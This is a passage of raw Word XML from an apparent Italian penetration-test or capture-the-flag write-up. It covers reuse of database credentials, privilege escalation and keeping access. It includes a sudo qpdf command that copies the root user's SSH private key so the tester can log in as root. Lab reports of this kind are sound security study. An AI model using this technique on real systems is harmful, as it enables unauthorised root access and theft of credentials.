      </w:r>
    </w:p>
    <w:p w:rsidR="209AF524" w:rsidP="21040C4D" w:rsidRDefault="209AF524" w14:paraId="4F3FE045" w14:textId="25F30B81">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
        <w:suppressLineNumbers w:val="0"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="120" w:beforeAutospacing="off" w:after="200" w:afterAutospacing="off" w:line="264" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r w:rsidRPr="21040C4D" w:rsidR="209AF524">
        <w:rPr>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve">" </w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="209AF524">
        <w:rPr>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
        <w:t>simple</w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="209AF524">
        <w:rPr>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="209AF524">
        <w:rPr>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
        <w:t>clean</w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="209AF524">
        <w:rPr>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
        <w:t>”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="21040C4D" w:rsidP="21040C4D" w:rsidRDefault="21040C4D" w14:paraId="3C5EDCBD" w14:textId="0942B713">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
        <w:suppressLineNumbers w:val="0"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="120" w:beforeAutospacing="off" w:after="200" w:afterAutospacing="off" w:line="264" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="5811B926" w:rsidP="21040C4D" w:rsidRDefault="5811B926" w14:paraId="0156B02F" w14:textId="76A95ABB">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="120" w:beforeAutospacing="off" w:after="200" w:afterAutospacing="off" w:line="264" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r w:rsidR="5811B926">
        <w:drawing>
          <wp:inline wp14:editId="67697411" wp14:anchorId="21440EC6">
            <wp:extent cx="2923810" cy="790476"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1709320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1d5ceeb84446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11B926" w:rsidP="21040C4D" w:rsidRDefault="5811B926" w14:paraId="2DC963B7" w14:textId="6C270429">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="120" w:beforeAutospacing="off" w:after="200" w:afterAutospacing="off" w:line="264" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r w:rsidR="5811B926">
        <w:rPr/>
        <w:t>Tramite le credenziali del database si è riusciti ad effettuare l’accesso sulla macchina locale in quanto utilizzava le stesse credenziali.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="7B79342D" w:rsidP="21040C4D" w:rsidRDefault="7B79342D" w14:paraId="41823C02" w14:textId="373D8613">
      <w:pPr>
        <w:pStyle w:val="Titolo1"/>
        <w:bidi w:val="0"/>
      </w:pPr>
      <w:bookmarkStart w:name="_Toc1034655777" w:id="1674877506"/>
      <w:r w:rsidR="7B79342D">
        <w:rPr/>
        <w:t>Privile</w:t>
      </w:r>
      <w:r w:rsidR="7DDF2683">
        <w:rPr/>
        <w:t>ge</w:t>
      </w:r>
      <w:r w:rsidR="7DDF2683">
        <w:rPr/>
        <w:t xml:space="preserve"> Escalation</w:t>
      </w:r>
      <w:bookmarkEnd w:id="1674877506"/>
    </w:p>
    <w:p w:rsidR="76755DCF" w:rsidP="21040C4D" w:rsidRDefault="76755DCF" w14:paraId="12A5277A" w14:textId="52FA624D">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
        <w:bidi w:val="0"/>
      </w:pPr>
      <w:r w:rsidR="76755DCF">
        <w:rPr/>
        <w:t xml:space="preserve">Entrati ora nella macchina non ci resta altro che </w:t>
      </w:r>
      <w:r w:rsidR="76755DCF">
        <w:rPr/>
        <w:t>effettuare</w:t>
      </w:r>
      <w:r w:rsidR="76755DCF">
        <w:rPr/>
        <w:t xml:space="preserve"> l’elevazione dei privilegi.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="2F47A459" w:rsidP="21040C4D" w:rsidRDefault="2F47A459" w14:paraId="77CCB8FC" w14:textId="4F777D7C">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
        <w:bidi w:val="0"/>
      </w:pPr>
      <w:r w:rsidR="2F47A459">
        <w:rPr/>
        <w:t>Una buona pratica è ricercare qualche comando che può essere di nostro interesse quindi andiamo ad effettuare una “</w:t>
      </w:r>
      <w:r w:rsidR="2F47A459">
        <w:rPr/>
        <w:t>ls</w:t>
      </w:r>
      <w:r w:rsidR="2F47A459">
        <w:rPr/>
        <w:t xml:space="preserve"> -la /</w:t>
      </w:r>
      <w:r w:rsidR="2F47A459">
        <w:rPr/>
        <w:t>usr</w:t>
      </w:r>
      <w:r w:rsidR="2F47A459">
        <w:rPr/>
        <w:t>/bin”.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="2F47A459" w:rsidP="21040C4D" w:rsidRDefault="2F47A459" w14:paraId="0CDB6674" w14:textId="58977372">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
      </w:pPr>
      <w:r w:rsidR="2F47A459">
        <w:drawing>
          <wp:inline wp14:editId="53A2A323" wp14:anchorId="12F6F260">
            <wp:extent cx="5267324" cy="2867025"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="895378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f7724324014a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47A459" w:rsidP="21040C4D" w:rsidRDefault="2F47A459" w14:paraId="2D5BE167" w14:textId="045EE587">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
      </w:pPr>
      <w:r w:rsidR="2F47A459">
        <w:rPr/>
        <w:t>Tra questi comandi troviamo “</w:t>
      </w:r>
      <w:r w:rsidR="2F47A459">
        <w:rPr/>
        <w:t>qpdf</w:t>
      </w:r>
      <w:r w:rsidR="2F47A459">
        <w:rPr/>
        <w:t>” che è un comando che può essere molto utile in quanto possiamo andare</w:t>
      </w:r>
      <w:r w:rsidR="2916A7FC">
        <w:rPr/>
        <w:t xml:space="preserve"> ad effettuare copie di file di cui normalmente non dovremmo essere in possesso, come delle </w:t>
      </w:r>
      <w:r w:rsidR="56C8D019">
        <w:rPr/>
        <w:t>informazioni personali</w:t>
      </w:r>
      <w:r w:rsidR="2916A7FC">
        <w:rPr/>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="2916A7FC" w:rsidP="21040C4D" w:rsidRDefault="2916A7FC" w14:paraId="679E4079" w14:textId="67A705CC">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
      </w:pPr>
      <w:r w:rsidR="2916A7FC">
        <w:rPr/>
        <w:t xml:space="preserve">Avuta questa intuizione non ci basta che creare un file vuoto in cui verrà copiata la chiave </w:t>
      </w:r>
      <w:r w:rsidR="1FF0E94D">
        <w:rPr/>
        <w:t>OpenSHH di root</w:t>
      </w:r>
      <w:r w:rsidR="2916A7FC">
        <w:rPr/>
        <w:t>, salvarla in locale e connetterci.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="56E8BE89" w:rsidP="21040C4D" w:rsidRDefault="56E8BE89" w14:paraId="72881DE5" w14:textId="41942B42">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
      </w:pPr>
      <w:r w:rsidR="56E8BE89">
        <w:rPr/>
        <w:t xml:space="preserve">Il comando </w:t>
      </w:r>
      <w:r w:rsidR="56E8BE89">
        <w:rPr/>
        <w:t>qpdf</w:t>
      </w:r>
      <w:r w:rsidR="56E8BE89">
        <w:rPr/>
        <w:t xml:space="preserve"> è il seguente:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="56E8BE89" w:rsidP="21040C4D" w:rsidRDefault="56E8BE89" w14:paraId="2A6849FF" w14:textId="2FC26AFB">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
        <w:bidi w:val="0"/>
        <w:rPr>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="21040C4D" w:rsidR="56E8BE89">
        <w:rPr>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
        <w:t>sudo</w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="56E8BE89">
        <w:rPr>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> /</w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="56E8BE89">
        <w:rPr>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
        <w:t>usr</w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="56E8BE89">
        <w:rPr>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
        <w:t>/bin/</w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="56E8BE89">
        <w:rPr>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
        <w:t>qpdf</w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="56E8BE89">
        <w:rPr>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> --empty /</w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="56E8BE89">
        <w:rPr>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
        <w:t>tmp</w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="56E8BE89">
        <w:rPr>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
        <w:t>/rsa.txt --</w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="56E8BE89">
        <w:rPr>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
        <w:t>qdf</w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="56E8BE89">
        <w:rPr>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> --add-attachment /root/.ssh/</w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="56E8BE89">
        <w:rPr>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
        <w:t>id_rsa</w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="56E8BE89">
        <w:rPr>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> --</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="56E8BE89" w:rsidP="21040C4D" w:rsidRDefault="56E8BE89" w14:paraId="5932E9D8" w14:textId="1AFAFEAE">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
        <w:bidi w:val="0"/>
        <w:rPr>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidR="56E8BE89">
        <w:rPr/>
        <w:t xml:space="preserve">In quanto </w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="56E8BE89">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
        </w:rPr>
        <w:t>consuela</w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="2F88D009">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidR="56E8BE89">
        <w:rPr>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">creata la copia del file </w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="56E8BE89">
        <w:rPr>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
        <w:t>/root/.</w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="56E8BE89">
        <w:rPr>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
        <w:t>ssh</w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="56E8BE89">
        <w:rPr>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="56E8BE89">
        <w:rPr>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
        <w:t>id_rsa</w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="56E8BE89">
        <w:rPr>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="56E8BE89">
        <w:rPr>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="2ECD7516">
        <w:rPr>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">on ci resta altro che stamparlo a schermo, usarlo e connetterci alla macchina target come </w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="2ECD7516">
        <w:rPr>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
        </w:rPr>
        <w:t>utenri</w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="2ECD7516">
        <w:rPr>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="2ECD7516">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
        </w:rPr>
        <w:t>root</w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="2ECD7516">
        <w:rPr>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="35CB9BDE" w:rsidP="21040C4D" w:rsidRDefault="35CB9BDE" w14:paraId="276D77A9" w14:textId="451CBAF1">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
      </w:pPr>
      <w:r w:rsidR="35CB9BDE">
        <w:drawing>
          <wp:inline wp14:editId="267748A2" wp14:anchorId="48B3D0C8">
            <wp:extent cx="5267324" cy="3228975"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="834702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de6581cce44d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CB9BDE">
        <w:drawing>
          <wp:inline wp14:editId="735C4683" wp14:anchorId="399ADCA7">
            <wp:extent cx="4762502" cy="5267324"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="18762086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6f455bb6d747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2" cy="526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CB9BDE" w:rsidP="21040C4D" w:rsidRDefault="35CB9BDE" w14:paraId="3DA02EEF" w14:textId="290CEF9F">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
      </w:pPr>
      <w:r w:rsidR="35CB9BDE">
        <w:rPr/>
        <w:t xml:space="preserve">Ed ecco così ottenuta la chiave di </w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="35CB9BDE">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
        </w:rPr>
        <w:t>root</w:t>
      </w:r>
      <w:r w:rsidR="35CB9BDE">
        <w:rPr>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> per un collegamento ssh.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="35CB9BDE" w:rsidP="21040C4D" w:rsidRDefault="35CB9BDE" w14:paraId="0BD30834" w14:textId="7876BE23">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
        <w:bidi w:val="0"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidR="35CB9BDE">
        <w:rPr>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Salviamo </w:t>
      </w:r>
      <w:r w:rsidR="49DD2D23">
        <w:rPr>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
        </w:rPr>
        <w:t>la chiave in privato e colleghiamoci.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="49DD2D23" w:rsidP="21040C4D" w:rsidRDefault="49DD2D23" w14:paraId="71D0DE08" w14:textId="6A26EE8B">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
      </w:pPr>
      <w:r w:rsidR="49DD2D23">
        <w:drawing>
          <wp:inline wp14:editId="7A323EBD" wp14:anchorId="6633992A">
            <wp:extent cx="5267324" cy="4238625"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="4981649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6cdeecd47f45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DD2D23" w:rsidP="21040C4D" w:rsidRDefault="49DD2D23" w14:paraId="1113BDCB" w14:textId="75E763C6">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
      </w:pPr>
      <w:r w:rsidR="49DD2D23">
        <w:rPr/>
        <w:t xml:space="preserve">Si rende evidente quindi la possibilità di ottenere accesso alla macchina come utente </w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="49DD2D23">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
        </w:rPr>
        <w:t>root</w:t>
      </w:r>
      <w:r w:rsidR="49DD2D23">
        <w:rPr>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="49DD2D23">
        <w:rPr>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
        </w:rPr>
        <w:t>soddisfando</w:t>
      </w:r>
      <w:r w:rsidR="49DD2D23">
        <w:rPr>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> i requisiti dell’elevazione dei privilegi.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="44C87B59" w:rsidP="21040C4D" w:rsidRDefault="44C87B59" w14:paraId="6A657879" w14:textId="37DA016C">
      <w:pPr>
        <w:pStyle w:val="Titolo1"/>
        <w:bidi w:val="0"/>
      </w:pPr>
      <w:bookmarkStart w:name="_Toc287300511" w:id="577345442"/>
      <w:r w:rsidR="44C87B59">
        <w:rPr/>
        <w:t>Maintaining</w:t>
      </w:r>
      <w:r w:rsidR="44C87B59">
        <w:rPr/>
        <w:t xml:space="preserve"> access</w:t>
      </w:r>
      <w:bookmarkEnd w:id="577345442"/>
    </w:p>
    <w:p w:rsidR="21040C4D" w:rsidP="21040C4D" w:rsidRDefault="21040C4D" w14:paraId="483381FA" w14:textId="3DC18895">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
        <w:bidi w:val="0"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="44C87B59" w:rsidP="21040C4D" w:rsidRDefault="44C87B59" w14:paraId="2BF8D00C" w14:textId="57CD5614">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
        <w:bidi w:val="0"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidR="44C87B59">
        <w:rPr/>
        <w:t xml:space="preserve">Per l’ultima fare di </w:t>
      </w:r>
      <w:r w:rsidR="44C87B59">
        <w:rPr/>
        <w:t>maintaing</w:t>
      </w:r>
      <w:r w:rsidR="44C87B59">
        <w:rPr/>
        <w:t xml:space="preserve"> access è stato pensato di utilizzare una strategia di </w:t>
      </w:r>
      <w:r w:rsidRPr="21040C4D" w:rsidR="44C87B59">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve">tunnelling </w:t>
      </w:r>
      <w:r w:rsidR="44C87B59">
        <w:rPr>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
        </w:rPr>
        <w:t>come SSH e collegarci al server come root ogni volt</w:t>
      </w:r>
      <w:r w:rsidR="4D3F32D0">
        <w:rPr>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
        </w:rPr>
        <w:t>a che o si desidera.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="4D3F32D0" w:rsidP="21040C4D" w:rsidRDefault="4D3F32D0" w14:paraId="53EF0F46" w14:textId="01814D22">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
        <w:bidi w:val="0"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidR="4D3F32D0">
        <w:rPr>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
        </w:rPr>
        <w:t>Riportiamo cioè quello visto poco prima.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="21040C4D" w:rsidP="21040C4D" w:rsidRDefault="21040C4D" w14:paraId="6788201D" w14:textId="1A790201">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="4D3F32D0" w:rsidP="21040C4D" w:rsidRDefault="4D3F32D0" w14:paraId="6D81443C" w14:textId="47D4BAB9">
      <w:pPr>
        <w:pStyle w:val="Normale"/>
      </w:pPr>
      <w:r w:rsidR="4D3F32D0">
        <w:drawing>
          <wp:inline wp14:editId="7847683B" wp14:anchorId="27840BC8">
            <wp:extent cx="5267324" cy="3226738"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="975370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fc325acd154c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3873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22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345496" w:rsidR="00345496" w:rsidSect="00CC239F">
      <w:footerReference w:type="default" r:id="rId11"/>
      <w:pgSz w:w="11906" w:h="16838" w:orient="portrait" w:code="9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C239F" w:rsidRDefault="00CC239F" w14:paraId="7E45DEAD" w14:textId="77777777">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:endnote>
  <w:endnote w:type="continuationSeparator" w:id="0">
    <w:p w:rsidR="00CC239F" w:rsidRDefault="00CC239F" w14:paraId="1D0515BF" w14:textId="7777777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638F6" w:rsidRDefault="00844483" w14:paraId="44ADE72C" w14:textId="77777777">
    <w:pPr>
      <w:pStyle w:val="Pidipagina"/>
    </w:pPr>
    <w:r w:rsidR="21040C4D">
      <w:rPr/>
      <w:t xml:space="preserve">PAGINA </w:t>
    </w:r>
    <w:r>
      <w:fldChar w:fldCharType="begin"/>
    </w:r>
    <w:r w:rsidRPr="21040C4D">
      <w:rPr>
        <w:lang w:bidi="it-IT"/>
      </w:rPr>
      <w:instrText xml:space="preserve"> PAGE  \* Arabic  \* MERGEFORMAT </w:instrText>
    </w:r>
    <w:r w:rsidRPr="21040C4D">
      <w:rPr>
        <w:lang w:bidi="it-IT"/>
      </w:rPr>
      <w:fldChar w:fldCharType="separate"/>
    </w:r>
    <w:r w:rsidR="21040C4D">
      <w:rPr/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C239F" w:rsidRDefault="00CC239F" w14:paraId="31EEC385" w14:textId="77777777">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:footnote>
  <w:footnote w:type="continuationSeparator" w:id="0">
    <w:p w:rsidR="00CC239F" w:rsidRDefault="00CC239F" w14:paraId="4B810E8C" w14:textId="77777777">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr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>
  <int2:observations>
    <int2:textHash int2:hashCode="onKXvelzLy5z+8" int2:id="psk3TozN">
      <int2:state int2:type="AugLoop_Text_Critique" int2:value="Rejected"/>
    </int2:textHash>
    <int2:textHash int2:hashCode="nAMqfaZOCS5mGE" int2:id="naLhc9hl">
      <int2:state int2:type="AugLoop_Text_Critique" int2:value="Rejected"/>
    </int2:textHash>
    <int2:textHash int2:hashCode="0IV1SqB6hVADDQ" int2:id="ROHYH0Sa">
      <int2:state int2:type="AugLoop_Text_Critique" int2:value="Rejected"/>
    </int2:textHash>
    <int2:textHash int2:hashCode="R1RwGhAR2e8LiH" int2:id="ih6Bna9M">
      <int2:state int2:type="AugLoop_Text_Critique" int2:value="Rejected"/>
    </int2:textHash>
    <int2:textHash int2:hashCode="RD5QLtF608yL65" int2:id="RT2pqALe">
      <int2:state int2:type="AugLoop_Text_Critique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9">
    <w:nsid w:val="22ed000b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18">
    <w:nsid w:val="6ef32f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6ccaea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14c8d67a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0" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="FFFFFF7C"/>
    <w:multiLevelType w:val="singleLevel"/>
    <w:tmpl w:val="F6FEF7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1D0ED9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8F7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2B2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D446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hint="default" w:ascii="Symbol" w:hAnsi="Symbol"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="5" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="FFFFFF81"/>
    <w:multiLevelType w:val="singleLevel"/>
    <w:tmpl w:val="C23041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</w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="6" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="FFFFFF82"/>
    <w:multiLevelType w:val="singleLevel"/>
    <w:tmpl w:val="D8B4F5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</w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="7" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="FFFFFF83"/>
    <w:multiLevelType w:val="singleLevel"/>
    <w:tmpl w:val="EC8E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Numeroelenco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5781F0C"/>
    <w:lvl w:ilvl="0">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:pStyle w:val="Puntoelenco"/>
      <w:lvlText w:val="−"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:hint="default" w:ascii="Century Gothic" w:hAnsi="Century Gothic"/>
        <w:color w:val="0D0D0D" w:themeColor="text1" w:themeTint="F2"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="10" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="09954B0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1BE42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F8F5B63"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="1CD6B866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2A3440CC"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="B5CE5722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65BC2713"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="04090023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5" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="6BE0360C"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="2E969558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24">
    <w:abstractNumId w:val="19"/>
  </w:num>
  <w:num w:numId="23">
    <w:abstractNumId w:val="18"/>
  </w:num>
  <w:num w:numId="22">
    <w:abstractNumId w:val="17"/>
  </w:num>
  <w:num w:numId="21">
    <w:abstractNumId w:val="16"/>
  </w:num>
  <w:num w:numId="1" w16cid:durableId="768619367">
    <w:abstractNumId w:val="9"/>
  </w:num>
  <w:num w:numId="2" w16cid:durableId="1572883870">
    <w:abstractNumId w:val="9"/>
  </w:num>
  <w:num w:numId="3" w16cid:durableId="889265445">
    <w:abstractNumId w:val="8"/>
  </w:num>
  <w:num w:numId="4" w16cid:durableId="1047606401">
    <w:abstractNumId w:val="8"/>
  </w:num>
  <w:num w:numId="5" w16cid:durableId="453526803">
    <w:abstractNumId w:val="9"/>
  </w:num>
  <w:num w:numId="6" w16cid:durableId="459304060">
    <w:abstractNumId w:val="8"/>
  </w:num>
  <w:num w:numId="7" w16cid:durableId="630937148">
    <w:abstractNumId w:val="11"/>
  </w:num>
  <w:num w:numId="8" w16cid:durableId="1271161842">
    <w:abstractNumId w:val="10"/>
  </w:num>
  <w:num w:numId="9" w16cid:durableId="1633748296">
    <w:abstractNumId w:val="13"/>
  </w:num>
  <w:num w:numId="10" w16cid:durableId="1304967143">
    <w:abstractNumId w:val="12"/>
  </w:num>
  <w:num w:numId="11" w16cid:durableId="1270312422">
    <w:abstractNumId w:val="15"/>
  </w:num>
  <w:num w:numId="12" w16cid:durableId="1938631257">
    <w:abstractNumId w:val="14"/>
  </w:num>
  <w:num w:numId="13" w16cid:durableId="1590583804">
    <w:abstractNumId w:val="7"/>
  </w:num>
  <w:num w:numId="14" w16cid:durableId="981543021">
    <w:abstractNumId w:val="6"/>
  </w:num>
  <w:num w:numId="15" w16cid:durableId="153423388">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="16" w16cid:durableId="821119679">
    <w:abstractNumId w:val="4"/>
